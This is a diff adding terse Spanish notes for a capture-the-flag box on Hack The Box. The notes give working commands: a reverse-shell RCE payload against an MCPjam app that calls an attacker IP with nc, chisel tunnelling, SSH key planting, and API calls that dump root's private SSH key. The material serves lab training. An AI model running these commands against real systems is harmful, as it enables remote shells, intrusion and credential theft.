@@ -1,0 +1,27 @@
+* revisa la pagina en devhub.thb, te chiva los puertos a usar
+* entra al puerto 6274, te muestra un app MCPjam con una vulneravilidad de RCE
+* utiliza el poc siguiente
+  http POST http://devhub.htb:6274/api/mcp/connect \
+    serverConfig:='{"command":"busybox","args":["nc","10.10.14.193","4444","-e","/bin/bash"],"env":{}}' \
+    serverId=12315asdfa2123asdf4asfd
+* utiliza ps aux | grep jupyter para ver el token contraseña
+
+* utiliza la revshell para con chisel tunelizar el puert 8888
+
+* usa el token-contraseña para acceder a jupyter Lab y aprovecha la consola python que te otorg apara ejecutar comandos
+
+* mete tu llave ssh publica para poder ganar acceso ssh
+
+* Investiga con ps aux los servicios, veras uno corriendo como root en el 5000 usa un tunel ssh para acceder a el
+
+* lee el servidor flask que muestra el servicio server.py
+
+* abusa de la informacion para que este server lea datos sensibles
+  + habilita
+    - http post http://localhost:5000/tools/call 'X-API-Key:opsmcp_secret_key_4f5a6b7c8d9e0f1a' name=ops._debug_mode
+  + loot
+    - http POST http://localhost:5000/tools/call   'X-API-Key:opsmcp_secret_key_4f5a6b7c8d9e0f1a'   name=ops._admin_dump   arguments:='{"target":"ssh_keys","confirm":true}'>
+* esto te chiva la ssh key priv de root, descargala, corrige el formato
+  - chmod 600 id_rsa_dumped 
+  - ssh -i id_rsa_dumped root@devhub.htb
+* recoge la root
